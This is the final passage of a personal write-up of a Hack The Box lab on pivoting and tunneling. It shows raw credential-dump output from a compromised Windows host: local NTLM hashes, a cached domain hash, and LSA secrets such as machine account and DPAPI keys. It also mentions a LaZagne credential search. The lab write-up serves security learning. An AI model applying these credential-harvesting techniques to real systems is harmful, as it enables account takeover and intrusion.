[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
apendragon:1003:aad3b435b51404eeaad3b435b51404ee:222007372da023ed0cdf0a4606bf9b23:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/vfrank:$DCC2$10240#vfrank#cfaf1869163aa26757496e1cd9970316: (2025-09-26 04:18:59)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:e43189e4c155445b30cc41c85872356b8e317218257b3bbcc85825d6301cff4b6990841a1bb00bc7f3534b058e2db0bff73e6b8ac94452466b1cf07342bced120a5c56e683adb5f9cf7c7bdafe42a705964689cb05fb89b402a9bd5a8730d2c00ebab307deffdb4243e3294ac4cb97b4d677cd570262759a4cd9ea18e8fd5d9dcff455ba717fea843ebe1946538455e4af41b393b4eeee0866df54b1e2d982edbc1399b216a4c0cf9b2552d4945d12deb542c96c2145c49733d9df2757b63ca21a430f529c191d965d41a8f34cb308a53c2a9f6bd226a45c949721910acc2969e08d5e9726d57a1cbb3048e29a739660
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a04c5f779121b6109b379cd930d2b75e
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] Cleaning up... 
```

The hash `31d6cfe0d16ae931b73c59d7e0c089c0` is the default NTLM/NT hash for an empty password (empty string).
The hash for `vfrank`, who is also a user on this host, was not provided, as it is only a domain account.

The final attempt searched for credentials in files. It were used a `LaZagne` and `cmd` commands, but nothing was found.

![][image16] ![][image17]



## MY NOTES 

I use my own app to record useful data during my "pentests".  https://lucasvmarangoni.github.io/notes/ 

![][image18] ![][image19] ![][image20] ![][image21]





[image21]: images/htb-pivoting-tunneling-and-port-forwarding/image21.png
[image20]: images/htb-pivoting-tunneling-and-port-forwarding/image20.png
[image19]: images/htb-pivoting-tunneling-and-port-forwarding/image19.png
[image18]: images/htb-pivoting-tunneling-and-port-forwarding/image18.png
[image17]: images/htb-pivoting-tunneling-and-port-forwarding/image17.png
[image16]: images/htb-pivoting-tunneling-and-port-forwarding/image16.png
[image15]: images/htb-pivoting-tunneling-and-port-forwarding/image15.png
[image14]: images/htb-pivoting-tunneling-and-port-forwarding/image14.png
[image13]: images/htb-pivoting-tunneling-and-port-forwarding/image13.png
[image12]: images/htb-pivoting-tunneling-and-port-forwarding/image12.png
[image11]: images/htb-pivoting-tunneling-and-port-forwarding/image11.png
[image10]: images/htb-pivoting-tunneling-and-port-forwarding/image10.png
[image9]: images/htb-pivoting-tunneling-and-port-forwarding/image9.png
[image8]: images/htb-pivoting-tunneling-and-port-forwarding/image8.png
[image7]: images/htb-pivoting-tunneling-and-port-forwarding/image7.png
[image6]: images/htb-pivoting-tunneling-and-port-forwarding/image6.png
[image5]: images/htb-pivoting-tunneling-and-port-forwarding/image5.png
[image4]: images/htb-pivoting-tunneling-and-port-forwarding/image4.png
[image3]: images/htb-pivoting-tunneling-and-port-forwarding/image3.png
[image2]: images/htb-pivoting-tunneling-and-port-forwarding/image2.png
[image1]: images/htb-pivoting-tunneling-and-port-forwarding/image1.png

